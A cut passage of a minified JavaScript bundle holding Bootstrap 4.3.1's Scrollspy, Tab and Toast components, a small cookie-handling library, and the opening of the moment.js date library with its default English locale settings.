return t + '[data-target="' + e + '"],' + t + '[href="' + e + '"]' }), n = d([].slice.call(document.querySelectorAll(t.join(",")))); n.hasClass("dropdown-item") ? (n.closest(".dropdown").find(".dropdown-toggle").addClass(ve), n.addClass(ve)) : (n.addClass(ve), n.parents(xe).prev(Fe + ", " + Qe).addClass(ve), n.parents(xe).prev(".nav-item").children(Fe).addClass(ve)), d(this._scrollElement).trigger(ye.ACTIVATE, { relatedTarget: e }) }, Ce._clear = function () { [].slice.call(document.querySelectorAll(this._selector)).filter(function (t) { return t.classList.contains(ve) }).forEach(function (t) { return t.classList.remove(ve) }) }, Xe._jQueryInterface = function (e) { return this.each(function () { var t = d(this).data(pe); if (t || (t = new Xe(this, "object" == typeof e && e), d(this).data(pe, t)), "string" == typeof e) { if (void 0 === t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, a(Xe, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "Default", get: function () { return be } }]), Xe); function Xe(t, e) { var n = this; this._element = t, this._scrollElement = "BODY" === t.tagName ? window : t, this._config = this._getConfig(e), this._selector = this._config.target + " " + Fe + "," + this._config.target + " " + Qe + "," + this._config.target + " .dropdown-item", this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, d(this._scrollElement).on(ye.SCROLL, function (t) { return n._process(t) }), this.refresh(), this._process() } d(window).on(ye.LOAD_DATA_API, function () { for (var t = [].slice.call(document.querySelectorAll('[data-spy="scroll"]')), e = t.length; e--;) { var n = d(t[e]); we._jQueryInterface.call(n, n.data()) } }), d.fn[Ae] = we._jQueryInterface, d.fn[Ae].Constructor = we, d.fn[Ae].noConflict = function () { return d.fn[Ae] = fe, we._jQueryInterface }; var Se, ke = "bs.tab", De = "." + ke, Ze = d.fn.tab, Ue = { HIDE: "hide" + De, HIDDEN: "hidden" + De, SHOW: "show" + De, SHOWN: "shown" + De, CLICK_DATA_API: "click" + De + ".data-api" }, We = "active", Ne = ".active", Te = "> li > .active", He = ((Se = Ee.prototype).show = function () { var t, e, n, i, o, a, s, r, g = this; this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && d(this._element).hasClass(We) || d(this._element).hasClass("disabled") || (e = d(this._element).closest(".nav, .list-group")[0], n = C.getSelectorFromElement(this._element), e && (i = "UL" === e.nodeName || "OL" === e.nodeName ? Te : Ne, o = (o = d.makeArray(d(e).find(i)))[o.length - 1]), a = d.Event(Ue.HIDE, { relatedTarget: this._element }), s = d.Event(Ue.SHOW, { relatedTarget: o }), o && d(o).trigger(a), d(this._element).trigger(s), s.isDefaultPrevented() || a.isDefaultPrevented() || (n && (t = document.querySelector(n)), this._activate(this._element, e), r = function () { var t = d.Event(Ue.HIDDEN, { relatedTarget: g._element }), e = d.Event(Ue.SHOWN, { relatedTarget: o }); d(o).trigger(t), d(g._element).trigger(e) }, t ? this._activate(t, t.parentNode, r) : r())) }, Se.dispose = function () { d.removeData(this._element, ke), this._element = null }, Se._activate = function (t, e, n) { function i() { return a._transitionComplete(t, s, n) } var o, a = this, s = (!e || "UL" !== e.nodeName && "OL" !== e.nodeName ? d(e).children(Ne) : d(e).find(Te))[0], r = n && s && d(s).hasClass("fade"); s && r ? (o = C.getTransitionDurationFromElement(s), d(s).removeClass("show").one(C.TRANSITION_END, i).emulateTransitionEnd(o)) : i() }, Se._transitionComplete = function (t, e, n) { var i, o, a; e && (d(e).removeClass(We), (i = d(e.parentNode).find("> .dropdown-menu .active")[0]) && d(i).removeClass(We), "tab" === e.getAttribute("role") && e.setAttribute("aria-selected", !1)), d(t).addClass(We), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !0), C.reflow(t), t.classList.contains("fade") && t.classList.add("show"), t.parentNode && d(t.parentNode).hasClass("dropdown-menu") && ((o = d(t).closest(".dropdown")[0]) && (a = [].slice.call(o.querySelectorAll(".dropdown-toggle")), d(a).addClass(We)), t.setAttribute("aria-expanded", !0)), n && n() }, Ee._jQueryInterface = function (n) { return this.each(function () { var t = d(this), e = t.data(ke); if (e || (e = new Ee(this), t.data(ke, e)), "string" == typeof n) { if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"'); e[n]() } }) }, a(Ee, null, [{ key: "VERSION", get: function () { return "4.3.1" } }]), Ee); function Ee(t) { this._element = t } d(document).on(Ue.CLICK_DATA_API, '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]', function (t) { t.preventDefault(), He._jQueryInterface.call(d(this), "show") }), d.fn.tab = He._jQueryInterface, d.fn.tab.Constructor = He, d.fn.tab.noConflict = function () { return d.fn.tab = Ze, He._jQueryInterface }; var Re, Ye = "toast", Oe = "bs.toast", _e = "." + Oe, Ve = d.fn[Ye], Le = { CLICK_DISMISS: "click.dismiss" + _e, HIDE: "hide" + _e, HIDDEN: "hidden" + _e, SHOW: "show" + _e, SHOWN: "shown" + _e }, Me = "show", ze = "showing", Pe = { animation: "boolean", autohide: "boolean", delay: "number" }, Ke = { animation: !0, autohide: !0, delay: 500 }, Je = ((Re = je.prototype).show = function () { var t, e = this; function n() { e._element.classList.remove(ze), e._element.classList.add(Me), d(e._element).trigger(Le.SHOWN), e._config.autohide && e.hide() } d(this._element).trigger(Le.SHOW), this._config.animation && this._element.classList.add("fade"), this._element.classList.remove("hide"), this._element.classList.add(ze), this._config.animation ? (t = C.getTransitionDurationFromElement(this._element), d(this._element).one(C.TRANSITION_END, n).emulateTransitionEnd(t)) : n() }, Re.hide = function (t) { var e = this; this._element.classList.contains(Me) && (d(this._element).trigger(Le.HIDE), t ? this._close() : this._timeout = setTimeout(function () { e._close() }, this._config.delay)) }, Re.dispose = function () { clearTimeout(this._timeout), this._timeout = null, this._element.classList.contains(Me) && this._element.classList.remove(Me), d(this._element).off(Le.CLICK_DISMISS), d.removeData(this._element, Oe), this._element = null, this._config = null }, Re._getConfig = function (t) { return t = s({}, Ke, d(this._element).data(), "object" == typeof t && t ? t : {}), C.typeCheckConfig(Ye, t, this.constructor.DefaultType), t }, Re._setListeners = function () { var t = this; d(this._element).on(Le.CLICK_DISMISS, '[data-dismiss="toast"]', function () { return t.hide(!0) }) }, Re._close = function () { function t() { n._element.classList.add("hide"), d(n._element).trigger(Le.HIDDEN) } var e, n = this; this._element.classList.remove(Me), this._config.animation ? (e = C.getTransitionDurationFromElement(this._element), d(this._element).one(C.TRANSITION_END, t).emulateTransitionEnd(e)) : t() }, je._jQueryInterface = function (n) { return this.each(function () { var t = d(this), e = t.data(Oe); if (e || (e = new je(this, "object" == typeof n && n), t.data(Oe, e)), "string" == typeof n) { if (void 0 === e[n]) throw new TypeError('No method named "' + n + '"'); e[n](this) } }) }, a(je, null, [{ key: "VERSION", get: function () { return "4.3.1" } }, { key: "DefaultType", get: function () { return Pe } }, { key: "Default", get: function () { return Ke } }]), je); function je(t, e) { this._element = t, this._config = this._getConfig(e), this._timeout = null, this._setListeners() } d.fn[Ye] = Je._jQueryInterface, d.fn[Ye].Constructor = Je, d.fn[Ye].noConflict = function () { return d.fn[Ye] = Ve, Je._jQueryInterface }, function () { if (void 0 === d) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript."); var t = d.fn.jquery.split(" ")[0].split("."); if (t[0] < 2 && t[1] < 9 || 1 === t[0] && 9 === t[1] && t[2] < 1 || 4 <= t[0]) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0") }(), t.Util = C, t.Alert = u, t.Button = F, t.Carousel = Y, t.Collapse = nt, t.Dropdown = ft, t.Modal = Ut, t.Popover = de, t.Scrollspy = we, t.Tab = He, t.Toast = Je, t.Tooltip = ie, Object.defineProperty(t, "__esModule", { value: !0 }) }), function (t) { var e, n, i = !1; "function" == typeof define && define.amd && (define(t), i = !0), "object" == typeof exports && (module.exports = t(), i = !0), i || (e = window.Cookies, (n = window.Cookies = t()).noConflict = function () { return window.Cookies = e, n }) }(function () { function C() { for (var t = 0, e = {}; t < arguments.length; t++) { var n = arguments[t]; for (var i in n) e[i] = n[i] } return e } return function t(h) { function d(t, e, n) { var i, o; if ("undefined" != typeof document) { if (1 < arguments.length) { "number" == typeof (n = C({ path: "/" }, d.defaults, n)).expires && ((o = new Date).setMilliseconds(o.getMilliseconds() + 864e5 * n.expires), n.expires = o), n.expires = n.expires ? n.expires.toUTCString() : ""; try { i = JSON.stringify(e), /^[\{\[]/.test(i) && (e = i) } catch (t) { } e = h.write ? h.write(e, t) : encodeURIComponent(String(e)).replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent), t = (t = (t = encodeURIComponent(String(t))).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent)).replace(/[\(\)]/g, escape); var a = ""; for (var s in n) n[s] && (a += "; " + s, !0 !== n[s] && (a += "=" + n[s])); return document.cookie = t + "=" + e + a } t || (i = {}); for (var r = document.cookie ? document.cookie.split("; ") : [], g = /(%[0-9A-Z]{2})+/g, l = 0; l < r.length; l++) { var c = r[l].split("="), I = c.slice(1).join("="); this.json || '"' !== I.charAt(0) || (I = I.slice(1, -1)); try { var u = c[0].replace(g, decodeURIComponent), I = h.read ? h.read(I, u) : h(I, u) || I.replace(g, decodeURIComponent); if (this.json) try { I = JSON.parse(I) } catch (t) { } if (t === u) { i = I; break } t || (i[u] = I) } catch (t) { } } return i } } return (d.set = d).get = function (t) { return d.call(d, t) }, d.getJSON = function () { return d.apply({ json: !0 }, [].slice.call(arguments)) }, d.defaults = {}, d.remove = function (t, e) { d(t, "", C(e, { expires: -1 })) }, d.withConverter = t, d }(function () { }) }), function (t, e) { "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : t.moment = e() }(this, function () { "use strict"; var t, o; function f() { return t.apply(null, arguments) } function l(t) { return t instanceof Array || "[object Array]" === Object.prototype.toString.call(t) } function c(t) { return null != t && "[object Object]" === Object.prototype.toString.call(t) } function I(t) { return void 0 === t } function u(t) { return "number" == typeof t || "[object Number]" === Object.prototype.toString.call(t) } function h(t) { return t instanceof Date || "[object Date]" === Object.prototype.toString.call(t) } function d(t, e) { for (var n = [], i = 0; i < t.length; ++i)n.push(e(t[i], i)); return n } function m(t, e) { return Object.prototype.hasOwnProperty.call(t, e) } function C(t, e) { for (var n in e) m(e, n) && (t[n] = e[n]); return m(e, "toString") && (t.toString = e.toString), m(e, "valueOf") && (t.valueOf = e.valueOf), t } function A(t, e, n, i) { return Fe(t, e, n, i, !0).utc() } function b(t) { return null == t._pf && (t._pf = { empty: !1, unusedTokens: [], unusedInput: [], overflow: -2, charsLeftOver: 0, nullInput: !1, invalidMonth: null, invalidFormat: !1, userInvalidated: !1, iso: !1, parsedDateParts: [], meridiem: null, rfc2822: !1, weekdayMismatch: !1 }), t._pf } function p(t) { if (null == t._isValid) { var e = b(t), n = o.call(e.parsedDateParts, function (t) { return null != t }), i = !isNaN(t._d.getTime()) && e.overflow < 0 && !e.empty && !e.invalidMonth && !e.invalidWeekday && !e.weekdayMismatch && !e.nullInput && !e.invalidFormat && !e.userInvalidated && (!e.meridiem || e.meridiem && n); if (t._strict && (i = i && 0 === e.charsLeftOver && 0 === e.unusedTokens.length && void 0 === e.bigHour), null != Object.isFrozen && Object.isFrozen(t)) return i; t._isValid = i } return t._isValid } function B(t) { var e = A(NaN); return null != t ? C(b(e), t) : b(e).userInvalidated = !0, e } o = Array.prototype.some ? Array.prototype.some : function (t) { for (var e = Object(this), n = e.length >>> 0, i = 0; i < n; i++)if (i in e && t.call(this, e[i], i, e)) return !0; return !1 }; var a = f.momentProperties = []; function y(t, e) { var n, i, o; if (I(e._isAMomentObject) || (t._isAMomentObject = e._isAMomentObject), I(e._i) || (t._i = e._i), I(e._f) || (t._f = e._f), I(e._l) || (t._l = e._l), I(e._strict) || (t._strict = e._strict), I(e._tzm) || (t._tzm = e._tzm), I(e._isUTC) || (t._isUTC = e._isUTC), I(e._offset) || (t._offset = e._offset), I(e._pf) || (t._pf = b(e)), I(e._locale) || (t._locale = e._locale), 0 < a.length) for (n = 0; n < a.length; n++)I(o = e[i = a[n]]) || (t[i] = o); return t } var e = !1; function v(t) { y(this, t), this._d = new Date(null != t._d ? t._d.getTime() : NaN), this.isValid() || (this._d = new Date(NaN)), !1 === e && (e = !0, f.updateOffset(this), e = !1) } function x(t) { return t instanceof v || null != t && null != t._isAMomentObject } function F(t) { return t < 0 ? Math.ceil(t) || 0 : Math.floor(t) } function Q(t) { var e = +t, n = 0; return 0 != e && isFinite(e) && (n = F(e)), n } function s(t, e, n) { for (var i = Math.min(t.length, e.length), o = Math.abs(t.length - e.length), a = 0, s = 0; s < i; s++)(n && t[s] !== e[s] || !n && Q(t[s]) !== Q(e[s])) && a++; return a + o } function r(t) { !1 === f.suppressDeprecationWarnings && "undefined" != typeof console && console.warn && console.warn("Deprecation warning: " + t) } function n(o, a) { var s = !0; return C(function () { if (null != f.deprecationHandler && f.deprecationHandler(null, o), s) { for (var t, e = [], n = 0; n < arguments.length; n++) { if (t = "", "object" == typeof arguments[n]) { for (var i in t += "\n[" + n + "] ", arguments[0]) t += i + ": " + arguments[0][i] + ", "; t = t.slice(0, -2) } else t = arguments[n]; e.push(t) } r(o + "\nArguments: " + Array.prototype.slice.call(e).join("") + "\n" + (new Error).stack), s = !1 } return a.apply(this, arguments) }, a) } var i, g = {}; function G(t, e) { null != f.deprecationHandler && f.deprecationHandler(t, e), g[t] || (r(e), g[t] = !0) } function w(t) { return t instanceof Function || "[object Function]" === Object.prototype.toString.call(t) } function X(t, e) { var n, i = C({}, t); for (n in e) m(e, n) && (c(t[n]) && c(e[n]) ? (i[n] = {}, C(i[n], t[n]), C(i[n], e[n])) : null != e[n] ? i[n] = e[n] : delete i[n]); for (n in t) m(t, n) && !m(e, n) && c(t[n]) && (i[n] = C({}, i[n])); return i } function S(t) { null != t && this.set(t) } f.suppressDeprecationWarnings = !1, f.deprecationHandler = null, i = Object.keys ? Object.keys : function (t) { var e, n = []; for (e in t) m(t, e) && n.push(e); return n }; var k = {}; function D(t, e) { var n = t.toLowerCase(); k[n] = k[n + "s"] = k[e] = t } function Z(t) { return "string" == typeof t ? k[t] || k[t.toLowerCase()] : void 0 } function U(t) { var e, n, i = {}; for (n in t) m(t, n) && (e = Z(n)) && (i[e] = t[n]); return i } var W = {}; function N(t, e) { W[t] = e } function T(t, e, n) { var i = "" + Math.abs(t), o = e - i.length; return (0 <= t ? n ? "+" : "" : "-") + Math.pow(10, Math.max(0, o)).toString().substr(1) + i } var H = /(\[[^\[]*\])|(\\)?([Hh]mm(ss)?|Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Qo?|YYYYYY|YYYYY|YYYY|YY|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|kk?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g, E = /(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g, R = {}, Y = {}; function O(t, e, n, i) { var o = "string" == typeof i ? function () { return this[i]() } : i; t && (Y[t] = o), e && (Y[e[0]] = function () { return T(o.apply(this, arguments), e[1], e[2]) }), n && (Y[n] = function () { return this.localeData().ordinal(o.apply(this, arguments), t) }) } function _(t, e) { return t.isValid() ? (e = V(e, t.localeData()), R[e] = R[e] || function (i) { for (var t, o = i.match(H), e = 0, a = o.length; e < a; e++)Y[o[e]] ? o[e] = Y[o[e]] : o[e] = (t = o[e]).match(/\[[\s\S]/) ? t.replace(/^\[|\]$/g, "") : t.replace(/\\/g, ""); return function (t) { for (var e = "", n = 0; n < a; n++)e += w(o[n]) ? o[n].call(t, i) : o[n]; return e } }(e), R[e](t)) : t.localeData().invalidDate() } function V(t, e) { var n = 5; function i(t) { return e.longDateFormat(t) || t } for (E.lastIndex = 0; 0 <= n && E.test(t);)t = t.replace(E, i), E.lastIndex = 0, --n; return t } var L = /\d/, M = /\d\d/, z = /\d{3}/, P = /\d{4}/, K = /[+-]?\d{6}/, J = /\d\d?/, j = /\d\d\d\d?/, $ = /\d\d\d\d\d\d?/, q = /\d{1,3}/, tt = /\d{1,4}/, et = /[+-]?\d{1,6}/, nt = /\d+/, it = /[+-]?\d+/, ot = /Z|[+-]\d\d:?\d\d/gi, at = /Z|[+-]\d\d(?::?\d\d)?/gi, st = /[0-9]{0,256}['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFF07\uFF10-\uFFEF]{1,256}|[\u0600-\u06FF\/]{1,256}(\s*?[\u0600-\u06FF]{1,256}){1,2}/i, rt = {}; function gt(t, n, i) { rt[t] = w(n) ? n : function (t, e) { return t && i ? i : n } } function lt(t) { return t.replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&") } var ct = {}; function It(t, n) { var e, i = n; for ("string" == typeof t && (t = [t]), u(n) && (i = function (t, e) { e[n] = Q(t) }), e = 0; e < t.length; e++)ct[t[e]] = i } function ut(t, o) { It(t, function (t, e, n, i) { n._w = n._w || {}, o(t, n._w, n, i) }) } var ht = 0, dt = 1, Ct = 2, At = 3, pt = 4, mt = 5, ft = 6, bt = 7, Bt = 8; function yt(t) { return vt(t) ? 366 : 365 } function vt(t) { return t % 4 == 0 && t % 100 != 0 || t % 400 == 0 } O("Y", 0, 0, function () { var t = this.year(); return t <= 9999 ? "" + t : "+" + t }), O(0, ["YY", 2], 0, function () { return this.year() % 100 }), O(0, ["YYYY", 4], 0, "year"), O(0, ["YYYYY", 5], 0, "year"), O(0, ["YYYYYY", 6, !0], 0, "year"), D("year", "y"), N("year", 1), gt("Y", it), gt("YY", J, M), gt("YYYY", tt, P), gt("YYYYY", et, K), gt("YYYYYY", et, K), It(["YYYYY", "YYYYYY"], ht), It("YYYY", function (t, e) { e[ht] = 2 === t.length ? f.parseTwoDigitYear(t) : Q(t) }), It("YY", function (t, e) { e[ht] = f.parseTwoDigitYear(t) }), It("Y", function (t, e) { e[ht] = parseInt(t, 10) }), f.parseTwoDigitYear = function (t) { return Q(t) + (68 < Q(t) ? 1900 : 2e3) }; var xt, Ft = Qt("FullYear", !0); function Qt(e, n) { return function (t) { return null != t ? (wt(this, e, t), f.updateOffset(this, n), this) : Gt(this, e) } } function Gt(t, e) { return t.isValid() ? t._d["get" + (t._isUTC ? "UTC" : "") + e]() : NaN } function wt(t, e, n) { t.isValid() && !isNaN(n) && ("FullYear" === e && vt(t.year()) && 1 === t.month() && 29 === t.date() ? t._d["set" + (t._isUTC ? "UTC" : "") + e](n, t.month(), Xt(n, t.month())) : t._d["set" + (t._isUTC ? "UTC" : "") + e](n)) } function Xt(t, e) { if (isNaN(t) || isNaN(e)) return NaN; var n = (e % 12 + 12) % 12; return t += (e - n) / 12, 1 == n ? vt(t) ? 29 : 28 : 31 - n % 7 % 2 } xt = Array.prototype.indexOf ? Array.prototype.indexOf : function (t) { for (var e = 0; e < this.length; ++e)if (this[e] === t) return e; return -1 }, O("M", ["MM", 2], "Mo", function () { return this.month() + 1 }), O("MMM", 0, 0, function (t) { return this.localeData().monthsShort(this, t) }), O("MMMM", 0, 0, function (t) { return this.localeData().months(this, t) }), D("month", "M"), N("month", 8), gt("M", J), gt("MM", J, M), gt("MMM", function (t, e) { return e.monthsShortRegex(t) }), gt("MMMM", function (t, e) { return e.monthsRegex(t) }), It(["M", "MM"], function (t, e) { e[dt] = Q(t) - 1 }), It(["MMM", "MMMM"], function (t, e, n, i) { var o = n._locale.monthsParse(t, i, n._strict); null != o ? e[dt] = o : b(n).invalidMonth = t }); var St = /D[oD]?(\[[^\[\]]*\]|\s)+MMMM?/, kt = "January_February_March_April_May_June_July_August_September_October_November_December".split("_"), Dt = "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"); function Zt(t, e) { var n; if (!t.isValid()) return t; if ("string" == typeof e) if (/^\d+$/.test(e)) e = Q(e); else if (!u(e = t.localeData().monthsParse(e))) return t; return n = Math.min(t.date(), Xt(t.year(), e)), t._d["set" + (t._isUTC ? "UTC" : "") + "Month"](e, n), t } function Ut(t) { return null != t ? (Zt(this, t), f.updateOffset(this, !0), this) : Gt(this, "Month") } var Wt = st, Nt = st; function Tt() { function t(t, e) { return e.length - t.length } for (var e, n = [], i = [], o = [], a = 0; a < 12; a++)e = A([2e3, a]), n.push(this.monthsShort(e, "")), i.push(this.months(e, "")), o.push(this.months(e, "")), o.push(this.monthsShort(e, "")); for (n.sort(t), i.sort(t), o.sort(t), a = 0; a < 12; a++)n[a] = lt(n[a]), i[a] = lt(i[a]); for (a = 0; a < 24; a++)o[a] = lt(o[a]); this._monthsRegex = new RegExp("^(" + o.join("|") + ")", "i"), this._monthsShortRegex = this._monthsRegex, this._monthsStrictRegex = new RegExp("^(" + i.join("|") + ")", "i"), this._monthsShortStrictRegex = new RegExp("^(" + n.join("|") + ")", "i") } function Ht(t) { var e, n; return t < 100 && 0 <= t ? ((n = Array.prototype.slice.call(arguments))[0] = t + 400, e = new Date(Date.UTC.apply(null, n)), isFinite(e.getUTCFullYear()) && e.setUTCFullYear(t)) : e = new Date(Date.UTC.apply(null, arguments)), e } function Et(t, e, n) { var i = 7 + e - n; return -(7 + Ht(t, 0, i).getUTCDay() - e) % 7 + i - 1 } function Rt(t, e, n, i, o) { var a, s = 1 + 7 * (e - 1) + (7 + n - i) % 7 + Et(t, i, o), r = s <= 0 ? yt(a = t - 1) + s : s > yt(t) ? (a = t + 1, s - yt(t)) : (a = t, s); return { year: a, dayOfYear: r } } function Yt(t, e, n) { var i, o, a = Et(t.year(), e, n), s = Math.floor((t.dayOfYear() - a - 1) / 7) + 1; return s < 1 ? i = s + Ot(o = t.year() - 1, e, n) : s > Ot(t.year(), e, n) ? (i = s - Ot(t.year(), e, n), o = t.year() + 1) : (o = t.year(), i = s), { week: i, year: o } } function Ot(t, e, n) { var i = Et(t, e, n), o = Et(t + 1, e, n); return (yt(t) - i + o) / 7 } function _t(t, e) { return t.slice(e, 7).concat(t.slice(0, e)) } O("w", ["ww", 2], "wo", "week"), O("W", ["WW", 2], "Wo", "isoWeek"), D("week", "w"), D("isoWeek", "W"), N("week", 5), N("isoWeek", 5), gt("w", J), gt("ww", J, M), gt("W", J), gt("WW", J, M), ut(["w", "ww", "W", "WW"], function (t, e, n, i) { e[i.substr(0, 1)] = Q(t) }), O("d", 0, "do", "day"), O("dd", 0, 0, function (t) { return this.localeData().weekdaysMin(this, t) }), O("ddd", 0, 0, function (t) { return this.localeData().weekdaysShort(this, t) }), O("dddd", 0, 0, function (t) { return this.localeData().weekdays(this, t) }), O("e", 0, 0, "weekday"), O("E", 0, 0, "isoWeekday"), D("day", "d"), D("weekday", "e"), D("isoWeekday", "E"), N("day", 11), N("weekday", 11), N("isoWeekday", 11), gt("d", J), gt("e", J), gt("E", J), gt("dd", function (t, e) { return e.weekdaysMinRegex(t) }), gt("ddd", function (t, e) { return e.weekdaysShortRegex(t) }), gt("dddd", function (t, e) { return e.weekdaysRegex(t) }), ut(["dd", "ddd", "dddd"], function (t, e, n, i) { var o = n._locale.weekdaysParse(t, i, n._strict); null != o ? e.d = o : b(n).invalidWeekday = t }), ut(["d", "e", "E"], function (t, e, n, i) { e[i] = Q(t) }); var Vt = "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"), Lt = "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"), Mt = "Su_Mo_Tu_We_Th_Fr_Sa".split("_"), zt = st, Pt = st, Kt = st; function Jt() { function t(t, e) { return e.length - t.length } for (var e, n, i, o, a = [], s = [], r = [], g = [], l = 0; l < 7; l++)e = A([2e3, 1]).day(l), n = this.weekdaysMin(e, ""), i = this.weekdaysShort(e, ""), o = this.weekdays(e, ""), a.push(n), s.push(i), r.push(o), g.push(n), g.push(i), g.push(o); for (a.sort(t), s.sort(t), r.sort(t), g.sort(t), l = 0; l < 7; l++)s[l] = lt(s[l]), r[l] = lt(r[l]), g[l] = lt(g[l]); this._weekdaysRegex = new RegExp("^(" + g.join("|") + ")", "i"), this._weekdaysShortRegex = this._weekdaysRegex, this._weekdaysMinRegex = this._weekdaysRegex, this._weekdaysStrictRegex = new RegExp("^(" + r.join("|") + ")", "i"), this._weekdaysShortStrictRegex = new RegExp("^(" + s.join("|") + ")", "i"), this._weekdaysMinStrictRegex = new RegExp("^(" + a.join("|") + ")", "i") } function jt() { return this.hours() % 12 || 12 } function $t(t, e) { O(t, 0, 0, function () { return this.localeData().meridiem(this.hours(), this.minutes(), e) }) } function qt(t, e) { return e._meridiemParse } O("H", ["HH", 2], 0, "hour"), O("h", ["hh", 2], 0, jt), O("k", ["kk", 2], 0, function () { return this.hours() || 24 }), O("hmm", 0, 0, function () { return "" + jt.apply(this) + T(this.minutes(), 2) }), O("hmmss", 0, 0, function () { return "" + jt.apply(this) + T(this.minutes(), 2) + T(this.seconds(), 2) }), O("Hmm", 0, 0, function () { return "" + this.hours() + T(this.minutes(), 2) }), O("Hmmss", 0, 0, function () { return "" + this.hours() + T(this.minutes(), 2) + T(this.seconds(), 2) }), $t("a", !0), $t("A", !1), D("hour", "h"), N("hour", 13), gt("a", qt), gt("A", qt), gt("H", J), gt("h", J), gt("k", J), gt("HH", J, M), gt("hh", J, M), gt("kk", J, M), gt("hmm", j), gt("hmmss", $), gt("Hmm", j), gt("Hmmss", $), It(["H", "HH"], At), It(["k", "kk"], function (t, e, n) { var i = Q(t); e[At] = 24 === i ? 0 : i }), It(["a", "A"], function (t, e, n) { n._isPm = n._locale.isPM(t), n._meridiem = t }), It(["h", "hh"], function (t, e, n) { e[At] = Q(t), b(n).bigHour = !0 }), It("hmm", function (t, e, n) { var i = t.length - 2; e[At] = Q(t.substr(0, i)), e[pt] = Q(t.substr(i)), b(n).bigHour = !0 }), It("hmmss", function (t, e, n) { var i = t.length - 4, o = t.length - 2; e[At] = Q(t.substr(0, i)), e[pt] = Q(t.substr(i, 2)), e[mt] = Q(t.substr(o)), b(n).bigHour = !0 }), It("Hmm", function (t, e, n) { var i = t.length - 2; e[At] = Q(t.substr(0, i)), e[pt] = Q(t.substr(i)) }), It("Hmmss", function (t, e, n) { var i = t.length - 4, o = t.length - 2; e[At] = Q(t.substr(0, i)), e[pt] = Q(t.substr(i, 2)), e[mt] = Q(t.substr(o)) }); var te, ee = Qt("Hours", !0), ne = { calendar: { sameDay: "[Today at] LT", nextDay: "[Tomorrow at] LT", nextWeek: "dddd [at] LT", lastDay: "[Yesterday at] LT", lastWeek: "[Last] dddd [at] LT", sameElse: "L" }, longDateFormat: { LTS: "h:mm:ss A", LT: "h:mm A", L: "MM/DD/YYYY", LL: "MMMM D, YYYY", LLL: "MMMM D, YYYY h:mm A", LLLL: "dddd, MMMM D, YYYY h:mm A" }, invalidDate: "Invalid date", ordinal: "%d", dayOfMonthOrdinalParse: /\d{1,2}/, relativeTime: { future: "in %s", past: "%s ago", s: "a few seconds", ss: "%d seconds", m: "a minute", mm: "%d minutes", h: "an hour", hh: "%d hours", d: "a day", dd: "%d days", M: "a month", MM: "%d months", y: "a year", yy: "%d years" }, months: kt, monthsShort: Dt, week: { dow: 0, doy: 6 }, weekdays: Vt, weekdaysMin: Mt, weekdaysShort: Lt, meridiemParse: /[ap]\.?m?\.?/i }, ie = {}, oe = {}; function ae(t) { return t ? t.toLowerCase().replace("_", "-") : t } function se(t) { var e = null; if (!ie[t] && "undefined" != typeof module && module && module.exports) try { e = te._abbr, require("./locale/" + t), re(e) } catch (t) { } return ie[t] } function re(t, e) { var n; return t && ((n = I(e) ? le(t) : ge(t, e)) ? te = n : "undefined" != typeof console && console.warn && console.warn("Locale " + t + " not found. Did you forget to load it?")), te._abbr } function ge(t, e) { if (null === e) return delete ie[t], null; var n, i = ne; if (e.abbr = t, null != ie[t]) G("defineLocaleOverride", "use moment.updateLocale(localeName, config) to change an existing locale. moment.defineLocale(localeName, config) should only be used for creating a new locale See https://momentjs.com/guides/#/warnings/define-locale/ for more info."), i = ie[t]._config; else if (null != e.parentLocale) if (null != ie[e.parentLocale]) i = ie[e.parentLocale]._config; else { if (null == (n = se(e.parentLocale))) return oe[e.parentLocale] || (oe[e.parentLocale] = []), oe[e.parentLocale].push({ name: t, config: e }), null; i = n._config } return ie[t] = new S(X(i, e)), oe[t] && oe[t].forEach(function (t) { ge(t.name, t.config) }), re(t), ie[t] } function le(t) { var e; if (t && t._locale && t._locale._abbr && (t = t._locale._abbr), !t) return te; if (!l(t)) { if (e = se(t)) return e; t = [t] } return function (t) { for (var e, n, i, o, a = 0; a < t.length;) { for (e = (o = ae(t[a]).split("-")).length, n = (n = ae(t[a + 1])) ? n.split("-") : null; 0 < e;) { if (i = se(o.slice(0, e).join("-"))) return i; if (n && n.length >= e && s(o, n, !0) >= e - 1) break; e-- } a++ } return te }(t) } function ce(t) { var e, n = t._a; return n && -2 === b(t).overflow && (e = n[dt] < 0 || 11 < n[dt] ? dt : n[Ct] < 1 || n[Ct] > Xt(n[ht], n[dt]) ? Ct : n[At] < 0 || 24 < n[At] || 24 === n[At] && (0 !== n[pt] || 0 !== n[mt] || 0 !== n[ft]) ? At : n[pt] < 0 || 59 < n[pt] ? pt : n[mt] < 0 || 59 < n[mt] ? mt : n[ft] < 0 || 999 < n[ft] ? ft : -1, b(t)._overflowDayOfYear && (e < ht || Ct < e) && (e = Ct), b(t)._overflowWeeks && -1 === e && (e = bt), b(t)._overflowWeekday && -1 === e && (e = Bt), b(t).overflow = e), t } function Ie(t, e, n) { return null != t ? t : null != e ? e : n } function ue(t) { var e, n, i, o, a, s, r, g, l, c, I, u, h, d, C = []; if (!t._d) { var A = t, p = new Date(f.now()), m = 